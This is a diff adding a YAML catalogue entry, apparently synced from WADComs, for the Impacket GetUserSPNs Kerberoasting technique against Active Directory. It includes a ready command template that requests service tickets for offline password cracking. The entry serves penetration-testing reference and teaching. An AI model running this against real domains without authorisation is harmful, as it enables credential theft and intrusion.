@@ -1,0 +1,30 @@
+id: wadcoms/impacket-getuserspns
+type: technique
+platform: active-directory
+name: Impacket GetUserSPNs
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- a valid password
+- a valid username
+commands:
+- template: python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
+  comment: 'Impacket''s GetUserSPNs.py will attempt to fetch Service Principal Names that are associated
+    with normal user accounts. What is returned is a ticket that is encrypted with the user account''s
+    password, which can then be bruteforced offline. Command Reference: Target IP: 10.10.10.1 '
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
+- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+tags:
+- active-directory
+- wadcoms
+- kerberos
